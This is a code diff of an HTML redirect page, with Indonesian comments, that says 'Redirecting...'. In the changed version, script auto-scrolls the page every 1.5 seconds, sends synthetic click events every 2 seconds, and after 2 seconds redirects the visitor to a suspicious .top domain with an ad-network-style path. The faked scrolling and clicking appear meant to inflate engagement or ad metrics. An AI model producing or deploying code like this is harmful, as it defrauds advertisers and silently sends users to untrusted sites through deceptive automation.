@@ -8,42 +8,40 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #fafafa;
+      background: #fff;
       text-align: center;
       padding-top: 100px;
       color: #333;
+      height: 3000px; /* Biar bisa scroll */
     }
   </style>
 </head>
 <body>
-  <h1>Please wait...</h1>
-  <p>We are redirecting you to the page</p>
+  <h1>Redirecting...</h1>
+  <p>Hold on... sending you to your destination!</p>
 
   <script>
-    // Simulasi scroll
-    function simulateScroll() {
-      window.scrollBy(0, 500); // Scroll ke bawah 500px
-      setTimeout(simulateScroll, 3000); // Ulangi setiap 3 detik
-    }
+    // Loop scroll tiap 1.5 detik
+    let scrollY = 0;
+    setInterval(() => {
+      scrollY += 200;
+      window.scrollTo({ top: scrollY, behavior: 'smooth' });
+    }, 1500);
 
-    // Simulasi klik
-    function simulateClick() {
+    // Loop klik tiap 2 detik
+    setInterval(() => {
       const clickEvent = new MouseEvent('click', {
         bubbles: true,
-        cancelable: true
+        cancelable: true,
+        view: window
       });
       document.body.dispatchEvent(clickEvent);
-      setTimeout(simulateClick, 5000); // Ulangi setiap 5 detik
-    }
+    }, 2000);
 
-    // Redirect setelah 3 detik
+    // Redirect cepat setelah 2 detik
     setTimeout(() => {
-      window.location.href = "https://whoockeg.top/4/9209440";
-    }, 3000);
-
-    // Mulai simulasi interaksi
-    simulateScroll();
-    simulateClick();
+      window.location.href = "https://phoampor.top/4/9209440";
+    }, 2000);
   </script>
 </body>
 </html>
